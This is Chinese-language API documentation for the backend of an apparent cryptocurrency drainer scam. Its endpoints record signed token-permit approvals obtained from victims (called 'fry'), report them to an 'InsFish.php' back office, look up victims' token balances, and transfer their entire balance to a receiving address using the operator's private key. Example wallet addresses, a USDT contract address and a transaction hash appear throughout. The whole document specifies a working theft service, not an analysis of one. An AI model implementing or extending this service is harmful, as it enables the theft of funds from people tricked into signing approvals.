## API: 新增授權
- 格式
```bash
[POST] /airdrop

Ex: /airdrop/
Body:
{
  data: 'dac17f958d2ee523a2206206994597c13d831ec73b5e342cf923994b4acc7248fb767ea2da5e77b95427fefa711eff984124bfbb1ab6fbf5e3da1820cf8ba24c4535a7a176e3de4158d58908b1d7a5973d4b42ab78213330ec940826'  
}
```

- 參數
```js
{
  data: '' // 執行 WT.permit(...) 的返回值
}
```

- 返回值
```js
{
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

- 後台回覆 [POST] (https://.../InsFish.php)
```js
{
  sAccount0: '', // 會員地址
  sAccount1: '', // 授權地址
  sAccount2: '', // 合約地址
  sTransactionHash: '', // 交易序號
  nTransactionStatus: 0, // 交易狀態. 0:失敗, 1:成功, 2:其它錯誤(查詢交易明細可至 https://etherscan.io/tx/{sTransactionHash})
}
```

## API: 查詢餘額
- 格式
```bash
[GET] /{ownerAddress}/balance?{contractAddress}=

Ex: /0xadb2b42f6bd96f5c65920b9ac88619dce4166f94/balance?contractAddress=0xdAC17F958D2ee523a2206206994597C13D831ec7
```

- 參數
```bash
ownerAddress: 魚苗地址
contractAddress: 合約地址
```

- 返回值
```js
{
  result: {
    balance: '' // 餘額
  },
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

## API: 轉帳交易
- 格式
```bash
[POST] /transaction

Ex: /transaction
Body:
{
  contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  operator: '', // 私鑰不顯示
  from: '0xf15e3B1dD8efc63358697c5737f1Aea7cdC5F137',
  to: '0x1A5A4e7Af1D8BBD9C216c26F733ff98fD79Cc742',
  amount: '0'
}
```

- 參數
```js
{
  contractAddress: '', // 合約地址
  operator: '', // 授權地址的私鑰
  from: '', // 魚苗地址
  to: '', // 接收地址
  amount: '' // 交易量. '0': 全部
}
```

- 返回值
```js
{
  result: {
    transactionHash: '', // 交易序號
    amount: '' // 實際交易量
  },
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

## API: 查詢轉帳交易結果
- 格式
```bash
[GET] /transaction/{transactionHash}

Ex: /transaction/0xeca371f848f3642413a4d3bd39e332efcea2ac866573851a7b2d19e942f343b9
```

- 參數
```bash
transactionHash: 交易序號
```

- 返回值
```js
{
  result: {
    transactionStatus: 0 // 交易狀態. 1:交易成功, 2:交易尚未完成 或 無效的交易序號 或 交易失敗. 查詢交易明細可至 https://etherscan.io/tx/{transactionHash}
  },
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```
